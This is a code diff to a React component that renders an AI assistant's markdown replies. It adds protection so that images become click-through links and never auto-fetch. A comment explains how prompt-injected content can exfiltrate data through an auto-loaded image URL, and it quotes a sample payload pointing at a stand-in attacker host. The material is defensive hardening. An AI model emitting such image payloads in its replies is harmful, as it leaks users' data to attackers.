@@ -1,8 +1,16 @@
 "use client";
 
 /** Assistant-reply markdown, styled with the console's --con-* tokens.
- *  react-markdown does NOT render raw HTML (no rehype-raw), so embedded
- *  HTML/script in model output stays escaped — safe for untrusted text. */
+ *
+ *  The text is treated as UNTRUSTED (model output can embed RAG/tool content):
+ *  - react-markdown does NOT render raw HTML (no rehype-raw), so embedded
+ *    HTML/script stays escaped;
+ *  - images are rendered as visible, NON-fetching links (see `img` below) —
+ *    a real <img> would make the viewer's browser auto-fetch an arbitrary URL
+ *    the moment the reply renders, which is a metadata-exfiltration channel
+ *    for prompt-injected content (`![x](https://attacker/...)`). Nothing else
+ *    react-markdown emits auto-fetches: links/autolinks require a click, and
+ *    GFM adds only tables/strikethrough/task-list checkboxes. */
 
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
@@ -24,6 +32,25 @@ export function AssistantMarkdown({ children }: { children: string }) {
               {...props}
             />
           ),
+          // SECURITY: never emit a real <img> for untrusted markdown — the
+          // browser would auto-fetch the URL on render. Show a click-through
+          // link instead so the user decides whether to load it.
+          img: ({ src, alt }) => {
+            const url = typeof src === "string" ? src.trim() : "";
+            const label = `[image${alt ? `: ${alt}` : ""}]`;
+            if (!url) return <span className="text-[color:var(--con-faint)]">{label}</span>;
+            return (
+              <a
+                href={url}
+                target="_blank"
+                rel="noopener noreferrer"
+                title={`Image link — not loaded automatically. Opens in a new tab: ${url}`}
+                className="text-[color:var(--con-accent)] underline decoration-dotted underline-offset-2"
+              >
+                {label}
+              </a>
+            );
+          },
           ul: (props) => <ul className="my-1.5 list-disc space-y-1 pl-5" {...props} />,
           ol: (props) => <ol className="my-1.5 list-decimal space-y-1 pl-5" {...props} />,
           li: (props) => <li className="leading-relaxed" {...props} />,
